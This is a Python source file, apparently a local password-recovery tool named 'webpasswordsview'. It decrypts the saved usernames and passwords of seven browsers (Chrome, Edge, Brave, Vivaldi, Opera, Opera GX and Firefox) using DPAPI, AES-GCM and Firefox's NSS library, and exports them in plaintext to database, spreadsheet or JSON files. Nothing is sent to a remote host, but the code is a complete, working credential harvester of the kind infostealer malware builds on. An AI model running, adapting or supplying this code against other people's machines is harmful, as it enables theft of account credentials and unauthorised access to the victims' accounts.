import os, json, base64, shutil, sqlite3, win32crypt, ctypes, datetime
import pandas as pd
from InquirerPy import inquirer
from mylibrary.Style import Clean
from Crypto.Cipher import AES
from ctypes import c_char_p, c_void_p, c_uint, Structure, byref



def get_encryption_key(data, localState):
    local_state_path = os.path.join(os.environ[data], localState)
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(ciphertext, key):
    try:
        if ciphertext[:3] == b'v10':
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16] 
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"Erro: {e}"

def get_unique_filename(path, name, extension):
    counter = 0
    file_path = os.path.join(path, f"{name}{extension}")
    while os.path.exists(file_path):
        counter += 1
        file_path = os.path.join(path, f"{name}({counter}){extension}")
    return file_path

def chromium_timestamp_to_datetime(timestamp):
    epoch_start = datetime.datetime(1601, 1, 1)
    return str(epoch_start + datetime.timedelta(microseconds=timestamp))



class GetPasswords:
    @staticmethod
    def operaGX():
        passwords = []
        db_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera GX Stable\Login Data')
        temp_db = 'temp_opera_gx.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='APPDATA', localState=r'Opera Software\Opera GX Stable\Local State')

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            print(f'browser: Opera - url: {url} - user: {user} - password: {password} - created: {chromium_timestamp_to_datetime(date_created)} - lastUsed: {chromium_timestamp_to_datetime(date_last_used)}')
            passwords.append({'browser': "Opera GX", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords
    
    @staticmethod
    def opera():
        passwords = []
        db_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable\Login Data')
        temp_db = 'temp_opera.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='APPDATA', localState=r'Opera Software\Opera Stable\Local State')

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            passwords.append({'browser': "Opera", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords

    @staticmethod
    def chrome():
        passwords = []
        db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
        
        temp_db = 'temp_chrome.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='LOCALAPPDATA' ,localState=r'Google\Chrome\User Data\Local State')
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
        # cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        # x = cursor.fetchall()
        # print(x)
        # for i in x:
        #     cursor.execute(f"PRAGMA table_info({i[0]});")
        #     columns = cursor.fetchall()
        #     cursor.execute(f"SELECT * FROM {i[0]}")
        #     print(f'{i[0]}: {columns} - {cursor.fetchall()}\n')

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            # print(f'browser: Chrome - url: {url} - user: {user} - password: {password} - created: {chromium_timestamp_to_datetime(date_created)} - lastUsed: {chromium_timestamp_to_datetime(date_last_used)}')
            passwords.append({'browser': "Chrome", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords
    
    @staticmethod
    def edge():
        passwords = []
        db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default\Login Data')
        temp_db = 'temp_chrome.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='LOCALAPPDATA' ,localState=r'Microsoft\Edge\User Data\Local State')

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            passwords.append({'browser': "Edge", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords
    
    @staticmethod
    def brave():
        passwords = []
        db_path = os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default\Login Data')
        temp_db = 'temp_chrome.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='LOCALAPPDATA' ,localState=r'BraveSoftware\Brave-Browser\User Data\Local State')

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            passwords.append({'browser': "Brave", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords
    
    @staticmethod
    def vivaldi():
        passwords = []
        db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Vivaldi\User Data\Default\Login Data')
        temp_db = 'temp_chrome.db'
        shutil.copyfile(db_path, temp_db)

        key = get_encryption_key(data='LOCALAPPDATA' ,localState=r'Vivaldi\User Data\Local State')

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")

        for url, user, encrypted_password, date_created, date_last_used in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            passwords.append({'browser': "Vivaldi", 'url': url, 'user': user, 'password': password, 'created': chromium_timestamp_to_datetime(date_created), 'lastUsed': chromium_timestamp_to_datetime(date_last_used)})

        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        return passwords

    class SECItem(Structure):
        _fields_ = [
            ('type', c_uint),
            ('data', c_void_p),
            ('len', c_uint)
        ]

    @staticmethod
    def firefox():
        passwords = []
        profile_dir = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\Profiles')
        profile = [p for p in os.listdir(profile_dir) if p.endswith('.default-release')][0]
        profile_path = os.path.join(profile_dir, profile)

        logins_path = os.path.join(profile_path, 'logins.json')
        with open(logins_path, 'r', encoding='utf-8') as f:
            logins = json.load(f)['logins']

        nss = ctypes.CDLL(os.path.join(r"C:\Program Files\Mozilla Firefox", "nss3.dll"))
        nss.NSS_Init(profile_path.encode('utf-8'))

        for login in logins:
            enc_user = GetPasswords.SECItem()
            enc_user_bytes = base64.b64decode(login['encryptedUsername'])
            enc_user.data = ctypes.cast(c_char_p(enc_user_bytes), c_void_p)
            enc_user.len = len(enc_user_bytes)
            dec_user = GetPasswords.SECItem()
            if nss.PK11SDR_Decrypt(byref(enc_user), byref(dec_user), None) == 0:
                username = ctypes.string_at(dec_user.data, dec_user.len).decode('utf-8')
            else:
                username = "Erro descriptografar"

            enc_pass = GetPasswords.SECItem()
            enc_pass_bytes = base64.b64decode(login['encryptedPassword'])
            enc_pass.data = ctypes.cast(c_char_p(enc_pass_bytes), c_void_p)
            enc_pass.len = len(enc_pass_bytes)
            dec_pass = GetPasswords.SECItem()
            if nss.PK11SDR_Decrypt(byref(enc_pass), byref(dec_pass), None) == 0:
                password = ctypes.string_at(dec_pass.data, dec_pass.len).decode('utf-8')
            else:
                password = "Erro descriptografar"

            created = str(datetime.datetime.fromtimestamp(login.get('timeCreated', 0) / 1000.0))
            last_used = str(datetime.datetime.fromtimestamp(login.get('timeLastUsed', 0) / 1000.0))

            passwords.append({'browser': "Firefox", 'url': login['hostname'], 'user': username, 'password': password, 'created': created, 'lastUsed': last_used})

        nss.NSS_Shutdown()
        return passwords



class Export:
    @staticmethod
    def database(data: list[dict]):
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        base_name = "webpasswordsview"
        ext = ".db"
        db_path = get_unique_filename(downloads_path, base_name, ext)

        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute("CREATE TABLE webpasswordsview (navegador TEXT, site TEXT, usuario TEXT, senha TEXT, criado_em TEXT, ultima_vez_usado TEXT)")
        conn.commit()

        registros = [(i['browser'], i['url'], i['user'], i['password'], i['created'], i['lastUsed']) for i in data]
        cursor.executemany("INSERT INTO webpasswordsview (navegador, site, usuario, senha, criado_em, ultima_vez_usado) VALUES (?, ?, ?, ?, ?, ?)", registros)

        conn.commit()

        conn.close()
        return db_path
    
    @staticmethod
    def excel(data: list[dict]):
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        base_name = "webpasswordsview"
        ext = ".xlsx"
        excel_path = get_unique_filename(downloads_path, base_name, ext)

        df = pd.DataFrame(data)
        df = df.rename(columns={'browser': "navegador", 'url': "site", 'user': "usuario", 'password': "senha", 'created': "criada_em", 'lastUsed': "ultima_vez_usada"})
        df.to_excel(excel_path, index=False)

        return excel_path

    @staticmethod
    def json(data: list[dict]):
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        base_name = "webpasswordsview"
        ext = ".json"
        json_path = get_unique_filename(downloads_path, base_name, ext)

        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

        return json_path



def getPasswords():
    while True:
        Clean()
        browsers = inquirer.checkbox(message="Escolha quais navegadores deseja investigar:", choices=["Chrome", "Firefox", "Edge", "Opera", "Opera GX", "Brave", "Vivaldi"],).execute()
        passwords = []
        Clean()

        if 'Chrome' in browsers:
            try:
                for i in GetPasswords.chrome():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Firefox' in browsers:
            try:
                for i in GetPasswords.firefox():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Edge' in browsers:
            try:
                for i in GetPasswords.edge():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Opera' in browsers:
            try:
                for i in GetPasswords.opera():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Opera GX' in browsers:
            try:
                for i in GetPasswords.operaGX():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Brave' in browsers:
            try:
                for i in GetPasswords.brave():
                    passwords.append(i)
            except FileNotFoundError:
                pass
        if 'Vivaldi' in browsers:
            try:
                for i in GetPasswords.vivaldi():
                    passwords.append(i)
            except FileNotFoundError:
                pass

        if not browsers:
            pass
        else:
            return passwords

def export(data: list[dict]):
    Clean()
    choices = inquirer.checkbox(message="Escolha para quais tipos de arquivo deseja exportar:", choices=[".db", ".xlsx", ".json"],).execute()
    Clean()

    if '.db' in choices:
        print(f'{Export.database(data)}')
    if '.xlsx' in choices:
        print(f'{Export.excel(data)}')
    if '.json' in choices:
        print(f'{Export.json(data)}')

    input()
    Clean()
